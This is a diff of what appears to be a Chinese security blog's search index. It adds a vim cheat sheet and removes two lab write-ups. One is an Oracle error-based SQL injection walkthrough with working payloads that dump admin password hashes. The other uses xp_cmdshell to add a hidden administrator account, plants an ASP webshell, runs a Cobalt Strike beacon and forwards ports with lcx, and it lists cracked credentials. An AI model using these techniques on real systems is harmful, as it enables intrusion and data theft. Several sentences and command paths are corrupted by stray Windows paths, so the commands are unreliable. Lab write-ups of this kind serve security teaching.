+<h4 id="&#x63D2;&#x5165;&#x6A21;&#x5F0F;&#xFF1A;&#x5C31;&#x662F;&#x53EF;&#x4EE5;&#x7F16;&#x8F91;&#x6587;&#x4EF6;&#x5185;&#x5BB9;&#x7684;&#x6A21;&#x5F0F;&#xFF0C;&#x5728;&#x6B63;&#x5E38;&#x6A21;&#x5F0F;&#x4E0B;&#x8F93;&#x5165;&#x4EE5;&#x4E0B;&#x5B57;&#x7B26;&#x8FDB;&#x5165;&#xFF1A;"><a href="#&#x63D2;&#x5165;&#x6A21;&#x5F0F;&#xFF1A;&#x5C31;&#x662F;&#x53EF;&#x4EE5;&#x7F16;&#x8F91;&#x6587;&#x4EF6;&#x5185;&#x5BB9;&#x7684;&#x6A21;&#x5F0F;&#xFF0C;&#x5728;&#x6B63;&#x5E38;&#x6A21;&#x5F0F;&#x4E0B;&#x8F93;&#x5165;&#x4EE5;&#x4E0B;&#x5B57;&#x7B26;&#x8FDB;&#x5165;&#xFF1A;" class="headerlink" title="&#x63D2;&#x5165;&#x6A21;&#x5F0F;&#xFF1A;&#x5C31;&#x662F;&#x53EF;&#x4EE5;&#x7F16;&#x8F91;&#x6587;&#x4EF6;&#x5185;&#x5BB9;&#x7684;&#x6A21;&#x5F0F;&#xFF0C;&#x5728;&#x6B63;&#x5E38;&#x6A21;&#x5F0F;&#x4E0B;&#x8F93;&#x5165;&#x4EE5;&#x4E0B;&#x5B57;&#x7B26;&#x8FDB;&#x5165;&#xFF1A;"></a>&#x63D2;&#x5165;&#x6A21;&#x5F0F;&#xFF1A;&#x5C31;&#x662F;&#x53EF;&#x4EE5;&#x7F16;&#x8F91;&#x6587;&#x4EF6;&#x5185;&#x5BB9;&#x7684;&#x6A21;&#x5F0F;&#xFF0C;&#x5728;&#x6B63;&#x5E38;&#x6A21;&#x5F0F;&#x4E0B;&#x8F93;&#x5165;&#x4EE5;&#x4E0B;&#x5B57;&#x7B26;&#x8FDB;&#x5165;&#xFF1A;</h4><p>i&#xFF1A;&#x5728;&#x5149;&#x6807;&#x5904;&#x8F93;&#x5165;<br>I&#xFF1A;&#x5728;&#x884C;&#x9996;&#x63D2;&#x5165;<br>a&#xFF1A;&#x5728;&#x5149;&#x6807;&#x4E0B;&#x4E00;&#x4E2A;&#x5B57;&#x7B26;&#x5904;&#x63D2;&#x5165;<br>A&#xFF1A;&#x5728;&#x884C;&#x4F4D;&#x63D2;&#x5165;<br>o&#xFF1A;&#x5728;&#x5149;&#x6807;&#x4E0B;&#x4E00;&#x884C;&#x63D2;&#x5165;&#x4E00;&#x884C;&#x7A7A;&#x884C;<br>O&#xFF1A;&#x5728;&#x5149;&#x6807;&#x4E0A;&#x4E00;&#x884C;&#x63D2;&#x5165;&#x4E00;&#x884C;&#x7A7A;&#x884C;<br>s&#xFF1A;&#x5220;&#x9664;&#x5149;&#x6807;&#x6240;&#x5728;&#x5B57;&#x7B26;&#x5E76;&#x63D2;&#x5165;<br>S&#xFF1A;&#x5220;&#x9664;&#x5149;&#x6807;&#x6240;&#x5728;&#x884C;&#x5E76;&#x63D2;&#x5165;</p>
+<h4 id="&#x7F16;&#x8F91;&#x6A21;&#x5F0F;&#xFF1A;&#x662F;&#x5BF9;&#x6574;&#x4E2A;&#x6587;&#x4EF6;&#x8FDB;&#x884C;&#x7684;&#x64CD;&#x4F5C;&#xFF0C;&#x5982;&#xFF1A;&#x4FDD;&#x5B58;&#x3001;&#x9000;&#x51FA;"><a href="#&#x7F16;&#x8F91;&#x6A21;&#x5F0F;&#xFF1A;&#x662F;&#x5BF9;&#x6574;&#x4E2A;&#x6587;&#x4EF6;&#x8FDB;&#x884C;&#x7684;&#x64CD;&#x4F5C;&#xFF0C;&#x5982;&#xFF1A;&#x4FDD;&#x5B58;&#x3001;&#x9000;&#x51FA;" class="headerlink" title="&#x7F16;&#x8F91;&#x6A21;&#x5F0F;&#xFF1A;&#x662F;&#x5BF9;&#x6574;&#x4E2A;&#x6587;&#x4EF6;&#x8FDB;&#x884C;&#x7684;&#x64CD;&#x4F5C;&#xFF0C;&#x5982;&#xFF1A;&#x4FDD;&#x5B58;&#x3001;&#x9000;&#x51FA;"></a>&#x7F16;&#x8F91;&#x6A21;&#x5F0F;&#xFF1A;&#x662F;&#x5BF9;&#x6574;&#x4E2A;&#x6587;&#x4EF6;&#x8FDB;&#x884C;&#x7684;&#x64CD;&#x4F5C;&#xFF0C;&#x5982;&#xFF1A;&#x4FDD;&#x5B58;&#x3001;&#x9000;&#x51FA;</h4><p>&#xFF1A;w        &#x4FDD;&#x5B58;<br>&#xFF1A;q        &#x9000;&#x51FA;<br>&#xFF1A;q&#xFF01;    &#x5F3A;&#x5236;&#x9000;&#x51FA;<br>&#xFF1A;wq        &#x4FDD;&#x5B58;&#x9000;&#x51FA;&#xFF0C;&#x7B49;&#x4EF7;&#x4E8E;shift+zz<br>&#xFF1A;x        &#x4FDD;&#x5B58;&#x9000;&#x51FA;&#xFF0C;&#x7B49;&#x4EF7;&#x4E8E;wq<br>&#xFF1A;set nu    &#x663E;&#x793A;&#x884C;&#x53F7;<br>&#xFF1A;set nonu    &#x9690;&#x85CF;&#x884C;&#x53F7;<br>&#xFF1A;&#x884C;&#x53F7;    &#x5B9A;&#x4F4D;&#x5230;&#x6307;&#x5B9A;&#x884C;&#x53F7;<br>/&#x5185;&#x5BB9;        &#x67E5;&#x627E;&#x6307;&#x5B9A;&#x5185;&#x5BB9;&#xFF0C;n&#x4E0B;&#x7FFB;&#xFF0C;N&#x4E0A;&#x7FFB;<br>&#xFF1A;%s/&#x539F;&#x5185;&#x5BB9;/&#x65B0;&#x5185;&#x5BB9;        &#x4F7F;&#x7528;&#x65B0;&#x5185;&#x5BB9;&#x66FF;&#x6362;&#x539F;&#x5185;&#x5BB9;&#xFF0C;&#x5168;&#x90E8;&#x66FF;&#x6362;<br>&#xFF1A;m,ns/&#x539F;&#x5185;&#x5BB9;/&#x65B0;&#x5185;&#x5BB9;    &#x4F7F;&#x7528;&#x65B0;&#x5185;&#x5BB9;&#x66FF;&#x6362;&#x539F;&#x5185;&#x5BB9;&#xFF0C;&#x66FF;&#x6362;m&#x884C;&#x5230;n&#x884C;</p>
+<p>&#x53CB;&#x60C5;&#x63D0;&#x793A;&#xFF1A;&#x82E5;&#x975E;&#x6B63;&#x5E38;&#x5173;&#x95ED;vim&#xFF0C;&#x5219;&#x4F1A;&#x751F;&#x6210;&#x4E34;&#x65F6;&#x6587;&#x4EF6;&#xFF08;&#x9690;&#x85CF;&#x7684;&#xFF09;&#xFF0C;&#x9700;&#x8981;&#x5220;&#x9664;</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure>
+
+]]></content>
+  </entry>
+  <entry>
     <title>xss</title>
     <url>/2021/09/04/xss/</url>
     <content><![CDATA[<p><strong>XSS&#xFF1A;</strong></p>
@@ -232,115 +341,6 @@
 <p><img src="/2021/09/04/xss/image-20210904171912298.png" alt="image-20210904171912298"></p>
 <p><strong>&#x6293;&#x5230;&#x7F51;&#x7AD9;&#x6240;&#x6709;cookie &#x548C;&#x952E;&#x76D8;&#x8BB0;&#x5F55;</strong></p>
 <p><img src="/2021/09/04/xss/image-20210904171930382.png" alt="image-20210904171930382"></p>
-]]></content>
-  </entry>
-  <entry>
-    <title>oracle注入报错注入</title>
-    <url>/2021/08/21/oracle/</url>
-    <content><![CDATA[<h4 id="oracle&#x6CE8;&#x5165;&#x62A5;&#x9519;&#x6CE8;&#x5165;&#x539F;&#x7406;&#xFF1A;"><a href="#oracle&#x6CE8;&#x5165;&#x62A5;&#x9519;&#x6CE8;&#x5165;&#x539F;&#x7406;&#xFF1A;" class="headerlink" title="oracle&#x6CE8;&#x5165;&#x62A5;&#x9519;&#x6CE8;&#x5165;&#x539F;&#x7406;&#xFF1A;"></a>oracle&#x6CE8;&#x5165;&#x62A5;&#x9519;&#x6CE8;&#x5165;&#x539F;&#x7406;&#xFF1A;</h4><p>&#x540C;MYSQL&#x6570;&#x636E;&#x5E93;&#x5DEE;&#x4E0D;&#x591A;&#xFF0C;&#x4F46;&#x662F;&#x4E00;&#x4E9B;&#x8BED;&#x6CD5;&#x4E0D;&#x540C;&#xFF0C;&#x76F8;&#x6BD4;&#x5176;&#x4ED6;&#x6570;&#x636E;&#x5E93;&#xFF0C;D:\blog\source_posts\oracle&#x6570;&#x636E;&#x5E93;&#x7684;&#x6570;&#x636E;&#x7C7B;&#x578B;&#x66F4;&#x52A0;&#x4E25;&#x8C28;&#xFF0C;&#x7531;&#x4E8E;&#x8FC7;&#x5EA6;&#x4E25;&#x8C28;&#xFF0C;&#x6240;&#x4EE5;&#xFF0C;&#x6211;&#x4EEC;&#x7528;&#x663E;&#x9519;&#x6CE8;&#x5165;&#xFF0C;&#x4F1A;&#x6BD4;&#x8F83;&#x9EBB;&#x70E6;&#xFF0C;&#x4E8E;&#x662F;&#xFF0C;&#x6211;&#x4EEC;&#x5229;&#x7528;&#x62A5;&#x9519;&#x7684;&#x65B9;&#x6CD5;&#xFF0C;&#x5FFD;&#x89C6;&#x6570;&#x636E;&#x7C7B;&#x578B;&#xFF0C;&#x76F4;&#x63A5;&#x83B7;&#x53D6;&#x6570;&#x636E;<code>CTXSYS.DRITHSX.SN(user,())</code></p>
-<h4 id="oracle&#x6CE8;&#x5165;&#x62A5;&#x9519;&#x6CE8;&#x5165;-&#x57FA;&#x672C;&#x7684;&#x8BED;&#x6CD5;&#xFF1A;"><a href="#oracle&#x6CE8;&#x5165;&#x62A5;&#x9519;&#x6CE8;&#x5165;-&#x57FA;&#x672C;&#x7684;&#x8BED;&#x6CD5;&#xFF1A;" class="headerlink" title="oracle&#x6CE8;&#x5165;&#x62A5;&#x9519;&#x6CE8;&#x5165; &#x57FA;&#x672C;&#x7684;&#x8BED;&#x6CD5;&#xFF1A;"></a>oracle&#x6CE8;&#x5165;&#x62A5;&#x9519;&#x6CE8;&#x5165; &#x57FA;&#x672C;&#x7684;&#x8BED;&#x6CD5;&#xFF1A;</h4><p><code>select from all_tables</code> &#x67E5;&#x8BE2;&#x51FA;&#x6240;&#x6709;&#x7684;&#x8868;</p>
-<p><code>select from user_tables</code> &#x67E5;&#x8BE2;&#x51FA;&#x5F53;&#x524D;&#x7528;&#x6237;&#x7684;&#x8868;</p>
-<p><code>select from all_tab_columns</code> &#x67E5;&#x8BE2;&#x51FA;&#x6240;&#x6709;&#x7684;&#x5B57;&#x6BB5;</p>
-<p><code>select from user_tab_columns</code> &#x67E5;&#x8BE2;&#x51FA;&#x5F53;&#x524D;&#x7528;&#x6237;&#x7684;&#x5B57;&#x6BB5;</p>
-<p><code>select * from v$version</code> &#x67E5;&#x7248;&#x672C;</p>
-<p>mssql&#x7CFB;&#x7EDF;&#x9ED8;&#x8BA4;&#x5E93;&#x3001;&#x8868; <code>sysobjects</code>&#x3001;<code>syscolumns</code> &#x3001;<code>sysdatabases</code></p>
-<p>sql&#x7CFB;&#x7EDF;&#x9ED8;&#x8BA4;&#x5E93;&#x3001;&#x8868; <code>information_schema.tables</code> &#x3001;<code>information_schema.columns</code></p>
-<p>oracel &#x7CFB;&#x7EDF;&#x9ED8;&#x8BA4;&#x5E93;&#x3001;&#x8868; <code>user_table dual</code><br>Dual&#x662F;&#x4E00;&#x4E2A;&#x5B9E;&#x8868;&#xFF08;&#x4E5F;&#x6709;&#x4EBA;&#x8BF4;&#x5B83;&#x662F;&#x865A;&#x8868;&#xFF09;&#xFF0C;&#x5982;&#x679C;&#x4F60;&#x76F4;&#x63A5;&#x67E5;&#x8BE2;&#x5B83;&#xFF0C;&#x5B83;&#x53EA;&#x663E;&#x793A;&#x4E00;&#x4E2A;X&#xFF0C;&#x5217;&#x540D;&#x4E3A;DUMMY</p>
-<h4 id="dual-&#x865A;&#x8868;"><a href="#dual-&#x865A;&#x8868;" class="headerlink" title="dual &#x865A;&#x8868;"></a>dual &#x865A;&#x8868;</h4><p>&#x56E0;&#x4E3A;&#x8BED;&#x6CD5;&#x8981;&#x6C42;&#x5728;&#x67E5;&#x8BE2;&#x65F6;&#x4E00;&#x5B9A;&#x8981;&#x52A0;&#x8868;&#x540D;<br>&#x4F8B;&#x5982;&#xFF1A;<br><code>select 1,2,3,4,5 from dual</code>&#x8FD9;&#x6837;&#x5C31;&#x4E0D;&#x4F1A;&#x62A5;&#x9519;&#xFF0C;&#x7528;&#x4E8E;&#x628A;&#x8BED;&#x6CD5;&#x8865;&#x5168;<br>D:\blog\source_posts\oracle&#x5F31;&#x5316;&#x4E86;&#x5E93;&#x7684;&#x6982;&#x5FF5;&#xFF0C;&#x4E00;&#x4E2A;&#x7528;&#x6237;&#x53EF;&#x4EE5;&#x7B80;&#x5355;&#x7406;&#x89E3;&#x4E3A;&#x4E00;&#x4E2A;&#x5E93;</p>
-<h4 id="&#x672C;&#x8282;&#x96BE;&#x70B9;&#xFF1A;"><a href="#&#x672C;&#x8282;&#x96BE;&#x70B9;&#xFF1A;" class="headerlink" title="&#x672C;&#x8282;&#x96BE;&#x70B9;&#xFF1A;"></a>&#x672C;&#x8282;&#x96BE;&#x70B9;&#xFF1A;</h4><p>&#x5982;&#x4F55;&#x5B9E;&#x73B0;limit &#x529F;&#x80FD;&#xFF1F;<br>D:\blog\source_posts\oracle &#x4E2D;&#x5229;&#x7528;<code>rownum=1</code>&#x53EF;&#x4EE5;&#x53D6;&#x4E00;&#x884C;&#x6570;&#x636E;</p>
-<p>&#x5F53;<code>rownum&lt;3</code>&#x53EF;&#x4EE5;&#x53D6;&#x4E24;&#x6761;</p>
-<p>&#x5F53; <code>rownum&lt;5</code>&#x53EF;&#x4EE5;&#x53D6;&#x56DB;&#x6761;<br>rownum &#x7684;&#x503C;&#x4F1A;&#x6839;&#x636E;&#x67E5;&#x8BE2;&#x7ED3;&#x679C;&#x8FDB;&#x884C;&#x6539;&#x53D8;<br>&#x8BED;&#x53E5;&#x5982;&#x4E0B;&#x53EF;&#x4EE5;&#x5B8C;&#x6210;limit&#x529F;&#x80FD;<br><code>select username from(select rownum r, username from all users) where r=1</code><br>&#x5B50;&#x67E5;&#x8BE2;&#x8FD4;&#x56DE;&#x4E00;&#x4E2A;&#x7ED3;&#x679C;&#x96C6;&#xFF0C;&#x7ED3;&#x679C;&#x96C6;&#x4E5F;&#x53EF;&#x4EE5;&#x770B;&#x4F5C;&#x662F;&#x4E00;&#x4E2A;&#x8868;&#xFF0C;&#x5176;&#x4E2D;&#x2018;r&#x2019;&#x8868;&#x793A;&#x4E00;&#x4E2A;&#x522B;&#x540D;&#xFF0C;&#x5728;&#x8FD9;&#x4E00;&#x53E5;&#x4E2D;&#x5C31;&#x662F;rownum&#x7684;&#x522B;&#x540D;</p>
-<p>&#x8FDB;&#x5165;&#x9776;&#x573A;<br>&#x53D1;&#x73B0;id&#x4F20;&#x53C2;&#xFF0C;and 1=1&#xFF0C;&#x7F51;&#x9875;&#x663E;&#x793A;&#x6B63;&#x5E38;</p>
-<p><img src="/2021/08/21/oracle/01.png" alt="01"></p>
-<p><code>and 1=2</code> &#x62A5;&#x9519;&#xFF0C;&#x8868;&#x793A;&#x4E0E;&#x6570;&#x636E;&#x5E93;&#x6709;&#x4EA4;&#x4E92;</p>
-<p><img src="/2021/08/21/oracle/02.png" alt="02"><br>&#x67E5;&#x5B57;&#x6BB5;&#xFF0C;<br><code>order by 4</code> &#x663E;&#x793A;&#x6B63;&#x5E38;</p>
-<p><img src="/2021/08/21/oracle/03.png" alt="03"></p>
-<p><code>order by 5</code> &#x62A5;&#x9519;&#xFF0C;&#x6709;4&#x4E2A;&#x5B57;&#x6BB5;</p>
-<p><img src="/2021/08/21/oracle/04.png" alt="04"></p>
-<p>&#x8054;&#x5408;&#x67E5;&#x8BE2;,&#x56E0;&#x4E3A;D:\blog\source_posts\oracle&#x6570;&#x636E;&#x5E93;&#x5BF9;&#x6570;&#x636E;&#x7C7B;&#x578B;&#x8981;&#x6C42;&#x5F88;&#x4E25;&#x683C;&#xFF0C;&#x6240;&#x4EE5;&#x4F7F;&#x7528;&#x8BED;&#x53E5;<br><code>union all select null,null,null,null from dual</code> </p>
-<p><img src="/2021/08/21/oracle/05.png" alt="05"><br>&#x4E0B;&#x9762;&#x4F7F;&#x7528;D:\blog\source_posts\oracle&#x65B9;&#x6CD5;</p>
-<h4 id="&#x4F18;&#x70B9;&#xFF1A;"><a href="#&#x4F18;&#x70B9;&#xFF1A;" class="headerlink" title="&#x4F18;&#x70B9;&#xFF1A;"></a>&#x4F18;&#x70B9;&#xFF1A;</h4><p>&#x53EF;&#x4EE5;&#x4E0D;&#x8003;&#x8651;&#x7C7B;&#x578B;</p>
-<h4 id="&#x539F;&#x7406;&#xFF1A;"><a href="#&#x539F;&#x7406;&#xFF1A;" class="headerlink" title="&#x539F;&#x7406;&#xFF1A;"></a>&#x539F;&#x7406;&#xFF1A;</h4><p>&#x5728;&#x6570;&#x636E;&#x5E93;&#x4E2D;&#x5BF9;&#x67E5;&#x8BE2;&#x76F8;&#x5E94;&#x7684;&#x5173;&#x952E;&#x8BCD;&#xFF0C;&#x7136;&#x540E;&#x67E5;&#x8BE2;&#x5931;&#x8D25;&#xFF0C;&#x7206;&#x51FA;&#x6570;&#x636E;</p>
-<h4 id="&#x51FD;&#x6570;&#xFF1A;ctxsys-drithsx-sn-user-select-banner-from-v-version-where-rownum-1"><a href="#&#x51FD;&#x6570;&#xFF1A;ctxsys-drithsx-sn-user-select-banner-from-v-version-where-rownum-1" class="headerlink" title="&#x51FD;&#x6570;&#xFF1A;ctxsys.drithsx.sn(user,(select banner from v$version where rownum=1))"></a>&#x51FD;&#x6570;&#xFF1A;<code>ctxsys.drithsx.sn(user,(select banner from v$version where rownum=1))</code></h4><p>&#x8FD9;&#x4E2A;&#x51FD;&#x6570;&#x5C31;&#x662F;&#x4E00;&#x4E2A;&#x67E5;&#x8BE2;&#xFF0C;&#x800C;&#x5B50;&#x67E5;&#x8BE2;&#x4F18;&#x5148;&#x8FDB;&#x884C;&#xFF0C;&#x6240;&#x4EE5;&#x5F53;&#x67E5;&#x8BE2;&#x51FD;&#x6570;&#x67E5;&#x4E0D;&#x5230;&#x7684;&#x65F6;&#x5019;&#xFF0C;&#x5C31;&#x4F1A;&#x62A5;&#x9519;&#xFF0C;&#x4F46;&#x662F;&#x6211;&#x4EEC;&#x771F;&#x6B63;&#x8981;&#x7684;&#x6570;&#x636E;&#x5728;&#x5B50;&#x67E5;&#x8BE2;&#x91CC;&#x5DF2;&#x7ECF;&#x67E5;&#x8FC7;&#x4E86;&#xFF0C;&#x901A;&#x8FC7;&#x62A5;&#x9519;&#x663E;&#x793A;&#x51FA;&#x6765;<br>&#x67E5;&#x8868;&#x540D;<br><code>and 1=ctxsys.drithsx.sn(1,(select table_name from user_tables where rownum=1))</code></p>
-<p><img src="/2021/08/21/oracle/06.png" alt="06"><br>&#x5F97;&#x5230;&#x8868;&#x540D;NEWS<br>&#x67E5;&#x5176;&#x4ED6;&#x8868;<br><code>and 1=ctxsys.drithsx.sn(1,(select table_name from user_tables where rownum=1 and table_name &lt;&gt;&apos;NEWS&apos;))</code></p>
-<p><img src="/2021/08/21/oracle/07.png" alt="07"></p>
-<p>&#x5F97;&#x5230;ADMIN&#x8868;<br>&#x67E5;&#x5B57;&#x6BB5;<br><code>and 1=ctxsys.drithsx.sn(1,(select column_name from user_tab_columns where table_name=&apos;ADMIN&apos; and rownum=1))</code></p>
-<p><img src="/2021/08/21/oracle/08.png" alt="08"><br>&#x5F97;&#x5230;ID &#x5B57;&#x6BB5;<br>&#x67E5;&#x5176;&#x4ED6;&#x5B57;&#x6BB5;<br><code>and 1=ctxsys.drithsx.sn(1,(select column_name from user_tab_columns where  rownum=1 and table_name =&apos;ADMIN&apos; and column_name&lt;&gt;&apos;ID&apos;))</code></p>
-<p><img src="/2021/08/21/oracle/09.png" alt="09"><br>&#x5F97;&#x5230;&#x5B57;&#x6BB5;UNAME<br>&#x518D;&#x67E5;&#x5176;&#x4ED6;&#x5B57;&#x6BB5;<br><code>and 1=ctxsys.drithsx.sn(1,(select column_name from user_tab_columns where  rownum=1 and table_name =&apos;ADMIN&apos; and column_name&lt;&gt;&apos;ID&apos; and  column_name&lt;&gt;&apos;UNAME&apos;))</code></p>
-<p><img src="/2021/08/21/oracle/10.png" alt="10"><br>&#x5F97;&#x5230;&#x5B57;&#x6BB5;UPASS<br>&#x67E5;&#x5185;&#x5BB9;<br><code>and 1=ctxsys.drithsx.sn(1,(select UPASS from ADMIN where rownum=1 ))</code></p>
-<p><img src="/2021/08/21/oracle/11.png" alt="11"><br>&#x5F97;&#x5230;&#x6570;&#x636E;&#xFF1A;<code>f583aea84b6ded258f529205eb6d56a7</code><br>&#x7EE7;&#x7EED;&#x67E5;&#x5176;&#x4ED6;&#x6570;&#x636E;<br><code>and 1=ctxsys.drithsx.sn(1,(select UPASS from ADMIN where rownum=1 and UPASS &lt;&gt; &apos;f583aea84b6ded258f529205eb6d56a7&apos;))</code></p>
-<p><img src="/2021/08/21/oracle/12.png" alt="12"><br>&#x8BD5;&#x8FC7;&#x53D1;&#x73B0;&#x8FD9;&#x4E2A;&#x4E5F;&#x4E0D;&#x662F;flag&#xFF0C;&#x7EE7;&#x7EED;<br><code>and 1=ctxsys.drithsx.sn(1,(select UPASS from ADMIN where rownum=1 and UPASS &lt;&gt; &apos;f583aea84b6ded258f529205eb6d56a7&apos; and UPASS &lt;&gt;  &apos;9e8e7f6953dd11ceccc6ce655e03e070&apos;))</code></p>
-<p><img src="/2021/08/21/oracle/13.png" alt="13"><br>&#x5F97;&#x5230;flag&#xFF1A;<br><code>2a61f8bcfe7535eadcfa69eb4406ceb9</code><br>&#x8F93;&#x5165;&#x901A;&#x5173;</p>
-]]></content>
-  </entry>
-  <entry>
-    <title>lcx端口转发</title>
-    <url>/2021/09/03/lcx/</url>
-    <content><![CDATA[<h2 id="&#x5185;&#x7F51;&#x6E17;&#x900F;-&#x7AEF;&#x53E3;&#x8F6C;&#x53D1;"><a href="#&#x5185;&#x7F51;&#x6E17;&#x900F;-&#x7AEF;&#x53E3;&#x8F6C;&#x53D1;" class="headerlink" title="&#x5185;&#x7F51;&#x6E17;&#x900F;:&#x7AEF;&#x53E3;&#x8F6C;&#x53D1;"></a>&#x5185;&#x7F51;&#x6E17;&#x900F;:&#x7AEF;&#x53E3;&#x8F6C;&#x53D1;</h2><p>&#x9776;&#x573A;&#x5730;&#x5740;</p>
-<p><a href="http://192.168.179.75/1.asp">http://192.168.179.75/1.asp</a></p>
-<p>&#x901A;&#x8FC7;fscan&#x626B;&#x63CF;&#x5F97;&#x5230;mssql&#x8D26;&#x53F7;&#x79D8;&#x5BC6;&#xFF0C;Navicat&#x94FE;&#x63A5;&#x767B;&#x5F55;&#x6570;&#x636E;&#x5E93;&#xFF0C;whoami&#x67E5;&#x770B;&#xFF0C;&#x5F53;&#x524D;&#x6743;&#x9650;&#x4E3A;system&#xFF0C;&#x521B;&#x5EFA;&#x8D26;&#x53F7;gd13$&#xFF0C;&#x5BC6;&#x7801;admin@123&#xFF0C;&#x6DFB;&#x52A0;&#x5230;administrator&#x7EC4;&#xFF0C;&#x901A;&#x8FC7;&#x8BE5;&#x8D26;&#x53F7;&#x8FDC;&#x7A0B;&#x767B;&#x5F55;&#xFF0C;&#x5728;www&#x76EE;&#x5F55;&#x4E0B;&#x5199;&#x5165;&#x4E00;&#x53E5;&#x8BDD;&#x6728;&#x9A6C;asp&#xFF0C;&#x6253;&#x5F00;kali&#x8681;&#x5251;&#x94FE;&#x63A5;</p>
-<p><img src="/2021/09/03/lcx/image-20210831191818764.png" alt="image-20210831191818764"></p>
-<p>fscan &#x626B;&#x63CF;&#x76EE;&#x6807;ip  </p>
-<p><code>/home/kali/cs4.2/tools/fscan_amd64 -h 192.168.179.75</code></p>
-<p><img src="/2021/09/03/lcx/image-20210831192054560.png" alt="image-20210831192054560"></p>
-<p><img src="/2021/09/03/lcx/image-20210831194028029.png" alt="image-20210831194028029"></p>
-<p><code>exec(&apos;xp_cmdshell &quot;whoami&quot;&apos;)</code></p>
-<p>&#x6DFB;&#x52A0;&#x7528;&#x6237; gd13$  admin@123 </p>
-<p><code>exec(&apos;xp_cmdshell &quot;net user gd13$ admin@123 /add&quot;&apos;)</code></p>
-<p><img src="/2021/09/03/lcx/image-20210831202425448.png" alt="image-20210831202425448"></p>
-<p><img src="/2021/09/03/lcx/image-20210831202530309.png" alt="image-20210831202530309"></p>
-<p><code>exec(&apos;xp_cmdshell &quot;net localgroup administrators gd13$ /add&quot;&apos;)</code></p>
-<p><code>exec(&apos;xp_cmdshell &quot;net localgroup administrators&quot;&apos;)</code></p>
-<p><img src="/2021/09/03/lcx/image-20210831202648860.png" alt="image-20210831202648860"></p>
-<p><img src="/2021/09/03/lcx/image-20210831203004613.png" alt="image-20210831203004613"></p>
-<p>&#x67E5;&#x770B;user&#x8868; &#x91CC;&#x9762;&#x6709;&#x7BA1;&#x7406;&#x5458;&#x8D26;&#x6237;&#x540D;&#x5BC6;&#x7801;&#xFF0C;&#x867D;&#x7136;&#x89E3;&#x5BC6;&#x6210;&#x529F;&#x4F46;&#x662F;&#xFF0C;&#x7981;&#x6B62;&#x8FDC;&#x7A0B;&#x767B;&#x5F55;</p>
-<p><img src="/2021/09/03/lcx/image-20210831203016345.png" alt="image-20210831203016345"></p>
-<p>admin     qwer1234!@#$</p>
-<p><img src="/2021/09/03/lcx/image-20210831204542590.png" alt="image-20210831204542590"></p>
-<p>bao  bao123</p>
-<p><img src="/2021/09/03/lcx/image-20210831203215306.png" alt="image-20210831203215306"></p>
-<p><img src="/2021/09/03/lcx/image-20210831205122155.png" alt="image-20210831205122155"></p>
-<p>kali&#x4E2D;&#x6253;&#x5F00;cs &#x94FE;&#x63A5;vps&#x670D;&#x52A1;&#x5668;</p>
-<p><img src="/2021/09/03/lcx/image-20210903204618071.png" alt="image-20210903204618071"></p>
-<p><img src="/2021/09/03/lcx/image-20210903204838431.png" alt="image-20210903204838431"></p>
-<p>&#x751F;&#x6210;Windows&#x7248;&#x7684;&#x8FDC;&#x63A7;&#x7A0B;&#x5E8F;</p>
-<p><img src="/2021/09/03/lcx/image-20210903205111769.png" alt="image-20210903205111769"></p>
-<p><img src="/2021/09/03/lcx/image-20210903205153499.png" alt="image-20210903205153499"></p>
-<p>&#x4F7F;&#x7528;&#x8681;&#x5251;&#x4E0A;&#x4F20;&#x8FDC;&#x63A7;&#x7A0B;&#x5E8F;</p>
-<p><img src="/2021/09/03/lcx/image-20210903205420939.png" alt="image-20210903205420939"></p>
-<p>&#x53CC;&#x51FB;&#x8FDC;&#x63A7;&#x7A0B;&#x5E8F;&#xFF0C;&#x5728;cs&#x4E2D;&#x67E5;&#x770B;</p>
-<p><img src="/2021/09/03/lcx/image-20210903210054589.png" alt="image-20210903210054589"></p>
-<p><img src="/2021/09/03/lcx/image-20210903210314507.png" alt="image-20210903210314507"></p>
-<p><img src="/2021/09/03/lcx/image-20210903210456317.png" alt="image-20210903210456317"></p>
-<p><code>shell C:\www\D:\blog\source\_posts\lcx.exe -tran 3333 192.168.1.107 8080</code></p>
-<p><img src="/2021/09/03/lcx/image-20210903211135544.png" alt="image-20210903211135544"></p>
-<p><img src="/2021/09/03/lcx/image-20210903211948437.png" alt="image-20210903211948437"></p>
-<p><img src="/2021/09/03/lcx/image-20210903212024618.png" alt="image-20210903212024618"></p>
-<p>&#x8F6C;&#x53D1;&#x6210;&#x529F;&#xFF0C;&#x8BBF;&#x95EE;75&#x7684;3333&#x7AEF;&#x53E3;&#xFF0C;107&#x7684;8080&#x7AEF;&#x53E3;&#x8F6C;&#x53D1;&#x6210;&#x529F;</p>
-<p><img src="/2021/09/03/lcx/image-20210903212112116.png" alt="image-20210903212112116"></p>
-<p><img src="/2021/09/03/lcx/image-20210903212704462.png" alt="image-20210903212704462"></p>
-<p><img src="/2021/09/03/lcx/image-20210903212729352.png" alt="image-20210903212729352"></p>
-<p>use18</p>
-<p><code>shell C:\www\D:\blog\source\_posts\lcx.exe -tran 4444 192.168.22.187 4444</code></p>
-<p><img src="/2021/09/03/lcx/image-20210903222630836.png" alt="image-20210903222630836"></p>
-<p><img src="/2021/09/03/lcx/image-20210903223233650.png" alt="image-20210903223233650"></p>
-<p><img src="/2021/09/03/lcx/image-20210903225319610.png" alt="image-20210903225319610"></p>
-<p><img src="/2021/09/03/lcx/image-20210903225342838.png" alt="image-20210903225342838"></p>
-<p>&#x8BBE;&#x7F6E;&#x7528;&#x6237;&#x540D;&#x548C;&#x5BC6;&#x7801;Tomcat</p>
-<p><img src="/2021/09/03/lcx/image-20210903230024732.png" alt="image-20210903230024732"></p>
-<p><img src="/2021/09/03/lcx/image-20210903230155364.png" alt="image-20210903230155364"></p>
-]]></content>
-  </entry>
-  <entry>
-    <title>vim终端编辑器</title>
-    <url>/2021/06/27/vim%E7%BB%88%E7%AB%AF%E7%BC%96%E8%BE%91%E5%99%A8/</url>
